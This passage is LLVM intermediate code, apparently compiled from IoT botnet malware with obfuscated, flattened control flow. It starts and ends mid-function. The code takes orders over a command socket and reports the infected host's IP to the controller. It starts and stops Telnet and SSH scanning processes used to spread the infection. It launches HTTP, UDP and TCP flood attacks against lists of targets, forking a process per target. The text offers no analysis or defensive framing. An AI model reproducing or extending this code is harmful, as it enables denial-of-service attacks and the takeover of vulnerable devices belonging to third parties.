  %44 = load i32, i32* @mainCommSock, align 4
  %45 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %46 = call i8* @inet_ntoa(i32 %45) #2
  %47 = call i32 (i32, i8*, ...) @sockprintf(i32 %44, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.61, i32 0, i32 0), i8* %46)
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strcmp(i8* %51, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0)) #10
  %53 = icmp ne i32 %52, 0
  %54 = select i1 %53, i32 1322387426, i32 -477850185
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %3, align 4
  %57 = icmp ne i32 %56, 2
  %58 = select i1 %57, i32 1133937387, i32 296716365
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.63, i32 0, i32 0))
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 1
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @strcmp(i8* %65, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %67 = icmp ne i32 %66, 0
  %68 = select i1 %67, i32 1923448429, i32 317998278
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* @scanPid, align 4
  %71 = icmp eq i32 %70, 0
  %72 = select i1 %71, i32 164542750, i32 -1617532252
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* @mainCommSock, align 4
  %76 = call i32 (i32, i8*, ...) @sockprintf(i32 %75, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.65, i32 0, i32 0))
  %77 = load i32, i32* @scanPid, align 4
  %78 = call i32 @kill(i32 %77, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  %79 = load i8**, i8*** %4, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 1
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.66, i32 0, i32 0)) #10
  %83 = icmp ne i32 %82, 0
  %84 = select i1 %83, i32 -968495341, i32 -548910258
  store i32 %84, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = load i32, i32* @scanPid, align 4
  %87 = icmp ne i32 %86, 0
  %88 = select i1 %87, i32 -1379536429, i32 106638145
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = call i32 @fork() #2
  store i32 %91, i32* %5, align 4
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = call i32 (i32, i8*, ...) @sockprintf(i32 %92, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0))
  %94 = load i32, i32* %5, align 4
  %95 = icmp ugt i32 %94, 0
  %96 = select i1 %95, i32 273137713, i32 -1705652046
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i32, i32* %5, align 4
  store i32 %98, i32* @scanPid, align 4
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %5, align 4
  %101 = icmp eq i32 %100, -1
  %102 = select i1 %101, i32 -1549601085, i32 -155146386
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 871808609, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  call void (i32, ...) bitcast (void ()* @TelnetScan to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i8**, i8*** %4, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 1
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 @strcmp(i8* %109, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.68, i32 0, i32 0)) #10
  %111 = icmp ne i32 %110, 0
  %112 = select i1 %111, i32 416542283, i32 473236823
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* @scanPid, align 4
  %115 = icmp ne i32 %114, 0
  %116 = select i1 %115, i32 824540282, i32 -1453582552
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @fork() #2
  store i32 %119, i32* %6, align 4
  %120 = load i32, i32* @mainCommSock, align 4
  %121 = call i32 (i32, i8*, ...) @sockprintf(i32 %120, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0))
  %122 = load i32, i32* %6, align 4
  %123 = icmp ugt i32 %122, 0
  %124 = select i1 %123, i32 -196496496, i32 1995563441
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %6, align 4
  store i32 %126, i32* @scanPid, align 4
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i32, i32* %6, align 4
  %129 = icmp eq i32 %128, -1
  %130 = select i1 %129, i32 -1085901508, i32 1612506859
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  store i32 857848142, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  call void (i32, ...) bitcast (void ()* @secureShellScan to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:134:                                    ; preds = %loopEntry
  store i32 1923448429, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i8**, i8*** %4, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 0
  %138 = load i8*, i8** %137, align 8
  %139 = call i32 @strcmp(i8* %138, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0)) #10
  %140 = icmp ne i32 %139, 0
  %141 = select i1 %140, i32 1744859761, i32 1860999832
  store i32 %141, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  %143 = load i32, i32* %3, align 4
  %144 = icmp slt i32 %143, 3
  %145 = select i1 %144, i32 1106934725, i32 1442714160
  store i32 %145, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i8**, i8*** %4, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 2
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @atoi(i8* %149) #10
  %151 = icmp slt i32 %150, 1
  %152 = select i1 %151, i32 1106934725, i32 898337494
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8**, i8*** %4, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 1
  %157 = load i8*, i8** %156, align 8
  store i8* %157, i8** %7, align 8
  %158 = load i8**, i8*** %4, align 8
  %159 = getelementptr inbounds i8*, i8** %158, i64 2
  %160 = load i8*, i8** %159, align 8
  %161 = call i32 @atoi(i8* %160) #10
  store i32 %161, i32* %8, align 4
  %162 = load i8*, i8** %7, align 8
  %163 = call i8* @strstr(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %164 = icmp ne i8* %163, null
  %165 = select i1 %164, i32 26611154, i32 -205496641
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load i8*, i8** %7, align 8
  %168 = call i8* @strtok(i8* %167, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %168, i8** %9, align 8
  store i32 1893786235, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8*, i8** %9, align 8
  %171 = icmp ne i8* %170, null
  %172 = select i1 %171, i32 2000352890, i32 1080093388
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = call i32 @listFork()
  %175 = icmp ne i32 %174, 0
  %176 = select i1 %175, i32 -1709784207, i32 1611200139
  store i32 %176, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8*, i8** %7, align 8
  %179 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* %178, i32 %179)
  %180 = load i32, i32* @mainCommSock, align 4
  %181 = call i32 @close(i32 %180)
  call void @_exit(i32 0) #12
  unreachable

; <label>:182:                                    ; preds = %loopEntry
  %183 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %183, i8** %9, align 8
  store i32 1893786235, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  store i32 -1311892375, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = call i32 @listFork()
  %187 = icmp ne i32 %186, 0
  %188 = select i1 %187, i32 81477237, i32 -173717025
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8*, i8** %7, align 8
  %192 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* %191, i32 %192)
  %193 = load i32, i32* @mainCommSock, align 4
  %194 = call i32 @close(i32 %193)
  call void @_exit(i32 0) #12
  unreachable

; <label>:195:                                    ; preds = %loopEntry
  store i32 1744859761, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 0
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @strcmp(i8* %199, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i32 0, i32 0)) #10
  %201 = icmp ne i32 %200, 0
  %202 = select i1 %201, i32 -1271505781, i32 2004044493
  store i32 %202, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i32, i32* %3, align 4
  %205 = icmp slt i32 %204, 6
  %206 = select i1 %205, i32 851163864, i32 -1580396716
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8**, i8*** %4, align 8
  %209 = getelementptr inbounds i8*, i8** %208, i64 3
  %210 = load i8*, i8** %209, align 8
  %211 = call i32 @atoi(i8* %210) #10
  %212 = icmp eq i32 %211, -1
  %213 = select i1 %212, i32 851163864, i32 205435291
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 2
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #10
  %219 = icmp eq i32 %218, -1
  %220 = select i1 %219, i32 851163864, i32 -1157788431
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i8**, i8*** %4, align 8
  %223 = getelementptr inbounds i8*, i8** %222, i64 4
  %224 = load i8*, i8** %223, align 8
  %225 = call i32 @atoi(i8* %224) #10
  %226 = icmp eq i32 %225, -1
  %227 = select i1 %226, i32 851163864, i32 409894191
  store i32 %227, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load i8**, i8*** %4, align 8
  %230 = getelementptr inbounds i8*, i8** %229, i64 5
  %231 = load i8*, i8** %230, align 8
  %232 = call i32 @atoi(i8* %231) #10
  %233 = icmp eq i32 %232, -1
  %234 = select i1 %233, i32 851163864, i32 1795014949
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 5
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #10
  %240 = icmp sgt i32 %239, 65500
  %241 = select i1 %240, i32 851163864, i32 893785483
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i8**, i8*** %4, align 8
  %244 = getelementptr inbounds i8*, i8** %243, i64 4
  %245 = load i8*, i8** %244, align 8
  %246 = call i32 @atoi(i8* %245) #10
  %247 = icmp sgt i32 %246, 32
  %248 = select i1 %247, i32 851163864, i32 1154890704
  store i32 %248, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %3, align 4
  %251 = icmp eq i32 %250, 7
  %252 = select i1 %251, i32 103474520, i32 1179130643
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 6
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @atoi(i8* %256) #10
  %258 = icmp slt i32 %257, 1
  %259 = select i1 %258, i32 851163864, i32 1179130643
  store i32 %259, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 1
  %264 = load i8*, i8** %263, align 8
  store i8* %264, i8** %10, align 8
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds i8*, i8** %265, i64 2
  %267 = load i8*, i8** %266, align 8
  %268 = call i32 @atoi(i8* %267) #10
  store i32 %268, i32* %11, align 4
  %269 = load i8**, i8*** %4, align 8
  %270 = getelementptr inbounds i8*, i8** %269, i64 3
  %271 = load i8*, i8** %270, align 8
  %272 = call i32 @atoi(i8* %271) #10
  store i32 %272, i32* %12, align 4
  %273 = load i8**, i8*** %4, align 8
  %274 = getelementptr inbounds i8*, i8** %273, i64 4
  %275 = load i8*, i8** %274, align 8
  %276 = call i32 @atoi(i8* %275) #10
  store i32 %276, i32* %13, align 4
  %277 = load i8**, i8*** %4, align 8
  %278 = getelementptr inbounds i8*, i8** %277, i64 5
  %279 = load i8*, i8** %278, align 8
  %280 = call i32 @atoi(i8* %279) #10
  store i32 %280, i32* %14, align 4
  %281 = load i32, i32* %3, align 4
  %282 = icmp eq i32 %281, 7
  %283 = select i1 %282, i32 1068559317, i32 -1394803582
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load i8**, i8*** %4, align 8
  %286 = getelementptr inbounds i8*, i8** %285, i64 6
  %287 = load i8*, i8** %286, align 8
  %288 = call i32 @atoi(i8* %287) #10
  store i32 -2071877062, i32* %switchVar
  store i32 %288, i32* %.reg2mem2
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  store i32 -2071877062, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:290:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %15, align 4
  %291 = load i8*, i8** %10, align 8
  %292 = call i8* @strstr(i8* %291, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %293 = icmp ne i8* %292, null
  %294 = select i1 %293, i32 -1661334344, i32 693198438
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i8*, i8** %10, align 8
  %297 = call i8* @strtok(i8* %296, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %297, i8** %16, align 8
  store i32 330837493, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  %299 = load i8*, i8** %16, align 8
  %300 = icmp ne i8* %299, null
  %301 = select i1 %300, i32 -1675961381, i32 811194151
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = call i32 @listFork()
  %304 = icmp ne i32 %303, 0
  %305 = select i1 %304, i32 2050772798, i32 2087230636
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load i8*, i8** %16, align 8
  %308 = load i32, i32* %11, align 4
  %309 = load i32, i32* %12, align 4
  %310 = load i32, i32* %13, align 4
  %311 = load i32, i32* %14, align 4
  %312 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %307, i32 %308, i32 %309, i32 %310, i32 %311, i32 %312)
  %313 = load i32, i32* @mainCommSock, align 4
  %314 = call i32 @close(i32 %313)
  call void @_exit(i32 0) #12
  unreachable

; <label>:315:                                    ; preds = %loopEntry
  %316 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %316, i8** %16, align 8
  store i32 330837493, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  store i32 847598992, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = call i32 @listFork()
  %320 = icmp ne i32 %319, 0
  %321 = select i1 %320, i32 -1083099608, i32 -588861527
  store i32 %321, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = load i8*, i8** %10, align 8
  %325 = load i32, i32* %11, align 4
  %326 = load i32, i32* %12, align 4
  %327 = load i32, i32* %13, align 4
  %328 = load i32, i32* %14, align 4
  %329 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %324, i32 %325, i32 %326, i32 %327, i32 %328, i32 %329)
  %330 = load i32, i32* @mainCommSock, align 4
  %331 = call i32 @close(i32 %330)
  call void @_exit(i32 0) #12
  unreachable

; <label>:332:                                    ; preds = %loopEntry
  store i32 -1271505781, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i8**, i8*** %4, align 8
  %335 = getelementptr inbounds i8*, i8** %334, i64 0
  %336 = load i8*, i8** %335, align 8
  %337 = call i32 @strcmp(i8* %336, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %338 = icmp ne i32 %337, 0
  %339 = select i1 %338, i32 1972872975, i32 1306114528
  store i32 %339, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  %341 = load i32, i32* %3, align 4
  %342 = icmp slt i32 %341, 6
  %343 = select i1 %342, i32 609728418, i32 295835254
  store i32 %343, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i8**, i8*** %4, align 8
  %346 = getelementptr inbounds i8*, i8** %345, i64 3
  %347 = load i8*, i8** %346, align 8
  %348 = call i32 @atoi(i8* %347) #10
  %349 = icmp eq i32 %348, -1
  %350 = select i1 %349, i32 609728418, i32 526523794
  store i32 %350, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i8**, i8*** %4, align 8
  %353 = getelementptr inbounds i8*, i8** %352, i64 2
  %354 = load i8*, i8** %353, align 8
  %355 = call i32 @atoi(i8* %354) #10
  %356 = icmp eq i32 %355, -1
  %357 = select i1 %356, i32 609728418, i32 -720634142
  store i32 %357, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i8**, i8*** %4, align 8
  %360 = getelementptr inbounds i8*, i8** %359, i64 4
  %361 = load i8*, i8** %360, align 8
  %362 = call i32 @atoi(i8* %361) #10
  %363 = icmp eq i32 %362, -1
  %364 = select i1 %363, i32 609728418, i32 -1319377313
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 4
  %368 = load i8*, i8** %367, align 8
  %369 = call i32 @atoi(i8* %368) #10
  %370 = icmp sgt i32 %369, 32
  %371 = select i1 %370, i32 609728418, i32 -7594696
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i32, i32* %3, align 4
  %374 = icmp sgt i32 %373, 6
  %375 = select i1 %374, i32 -396368139, i32 866261454
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load i8**, i8*** %4, align 8
  %378 = getelementptr inbounds i8*, i8** %377, i64 6
  %379 = load i8*, i8** %378, align 8
  %380 = call i32 @atoi(i8* %379) #10
  %381 = icmp slt i32 %380, 0
  %382 = select i1 %381, i32 609728418, i32 866261454
  store i32 %382, i32* %switchVar
  br label %loopEnd

; <label>:383:                                    ; preds = %loopEntry
  %384 = load i32, i32* %3, align 4
  %385 = icmp eq i32 %384, 8
  %386 = select i1 %385, i32 -77114430, i32 50667593
  store i32 %386, i32* %switchVar
  br label %loopEnd

; <label>:387:                                    ; preds = %loopEntry
  %388 = load i8**, i8*** %4, align 8
  %389 = getelementptr inbounds i8*, i8** %388, i64 7
  %390 = load i8*, i8** %389, align 8
  %391 = call i32 @atoi(i8* %390) #10
  %392 = icmp slt i32 %391, 1
  %393 = select i1 %392, i32 609728418, i32 50667593
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  %396 = load i8**, i8*** %4, align 8
  %397 = getelementptr inbounds i8*, i8** %396, i64 1
  %398 = load i8*, i8** %397, align 8
  store i8* %398, i8** %17, align 8
  %399 = load i8**, i8*** %4, align 8
  %400 = getelementptr inbounds i8*, i8** %399, i64 2
  %401 = load i8*, i8** %400, align 8
  %402 = call i32 @atoi(i8* %401) #10
  store i32 %402, i32* %18, align 4
  %403 = load i8**, i8*** %4, align 8
  %404 = getelementptr inbounds i8*, i8** %403, i64 3
  %405 = load i8*, i8** %404, align 8
  %406 = call i32 @atoi(i8* %405) #10
  store i32 %406, i32* %19, align 4
  %407 = load i8**, i8*** %4, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 4
  %409 = load i8*, i8** %408, align 8
  %410 = call i32 @atoi(i8* %409) #10
  store i32 %410, i32* %20, align 4
  %411 = load i8**, i8*** %4, align 8
  %412 = getelementptr inbounds i8*, i8** %411, i64 5
  %413 = load i8*, i8** %412, align 8
  store i8* %413, i8** %21, align 8
  %414 = load i32, i32* %3, align 4
  %415 = icmp eq i32 %414, 8
  %416 = select i1 %415, i32 -533597736, i32 -915306888
  store i32 %416, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 7
  %420 = load i8*, i8** %419, align 8
  %421 = call i32 @atoi(i8* %420) #10
  store i32 -1835566280, i32* %switchVar
  store i32 %421, i32* %.reg2mem4
  br label %loopEnd

; <label>:422:                                    ; preds = %loopEntry
  store i32 -1835566280, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:423:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %22, align 4
  %424 = load i32, i32* %3, align 4
  %425 = icmp sgt i32 %424, 6
  %426 = select i1 %425, i32 -1286726165, i32 788478552
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 6
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @atoi(i8* %430) #10
  store i32 218649571, i32* %switchVar
  store i32 %431, i32* %.reg2mem6
  br label %loopEnd

; <label>:432:                                    ; preds = %loopEntry
  store i32 218649571, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:433:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %23, align 4
  %434 = load i8*, i8** %17, align 8
  %435 = call i8* @strstr(i8* %434, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %436 = icmp ne i8* %435, null
  %437 = select i1 %436, i32 225375877, i32 1507461526
  store i32 %437, i32* %switchVar
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  %439 = load i8*, i8** %17, align 8
  %440 = call i8* @strtok(i8* %439, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %440, i8** %24, align 8
  store i32 1856926529, i32* %switchVar
  br label %loopEnd

; <label>:441:                                    ; preds = %loopEntry
  %442 = load i8*, i8** %24, align 8
  %443 = icmp ne i8* %442, null
  %444 = select i1 %443, i32 1567871966, i32 1712883121
  store i32 %444, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  %446 = call i32 @listFork()
  %447 = icmp ne i32 %446, 0
  %448 = select i1 %447, i32 884310750, i32 -51494974
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load i8*, i8** %24, align 8
  %451 = load i32, i32* %18, align 4
  %452 = load i32, i32* %19, align 4
  %453 = load i32, i32* %20, align 4
  %454 = load i8*, i8** %21, align 8
  %455 = load i32, i32* %23, align 4
  %456 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %450, i32 %451, i32 %452, i32 %453, i8* %454, i32 %455, i32 %456)
  %457 = load i32, i32* @mainCommSock, align 4
  %458 = call i32 @close(i32 %457)
  call void @_exit(i32 0) #12
  unreachable

; <label>:459:                                    ; preds = %loopEntry
  %460 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %460, i8** %24, align 8
  store i32 1856926529, i32* %switchVar
  br label %loopEnd

; <label>:461:                                    ; preds = %loopEntry
  store i32 -217874896, i32* %switchVar
  br label %loopEnd

; <label>:462:                                    ; preds = %loopEntry
  %463 = call i32 @listFork()
  %464 = icmp ne i32 %463, 0
  %465 = select i1 %464, i32 -1865748439, i32 -1440669285
  store i32 %465, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  %468 = load i8*, i8** %17, align 8
  %469 = load i32, i32* %18, align 4
  %470 = load i32, i32* %19, align 4
  %471 = load i32, i32* %20, align 4
  %472 = load i8*, i8** %21, align 8
  %473 = load i32, i32* %23, align 4
  %474 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %468, i32 %469, i32 %470, i32 %471, i8* %472, i32 %473, i32 %474)
  %475 = load i32, i32* @mainCommSock, align 4
  %476 = call i32 @close(i32 %475)
  call void @_exit(i32 0) #12
  unreachable

; <label>:477:                                    ; preds = %loopEntry
  store i32 1972872975, i32* %switchVar
  br label %loopEnd

; <label>:478:                                    ; preds = %loopEntry
  %479 = load i8**, i8*** %4, align 8
  %480 = getelementptr inbounds i8*, i8** %479, i64 0
  %481 = load i8*, i8** %480, align 8
  %482 = call i32 @strcmp(i8* %481, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0)) #10
  %483 = icmp ne i32 %482, 0
  %484 = select i1 %483, i32 1461694224, i32 1624925900
  store i32 %484, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i64 0, i64* %26, align 8
  store i32 -156062030, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  %487 = load i64, i64* %26, align 8
  %488 = load i64, i64* @numpids, align 8
  %489 = icmp ult i64 %487, %488
  %490 = select i1 %489, i32 -2137398529, i32 -505784301
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32*, i32** @pids, align 8
  %493 = load i64, i64* %26, align 8
  %494 = getelementptr inbounds i32, i32* %492, i64 %493
  %495 = load i32, i32* %494, align 4
  %496 = icmp ne i32 %495, 0
  %497 = select i1 %496, i32 712736641, i32 833340789
  store i32 %497, i32* %switchVar
  br label %loopEnd

; <label>:498:                                    ; preds = %loopEntry
  %499 = load i32*, i32** @pids, align 8
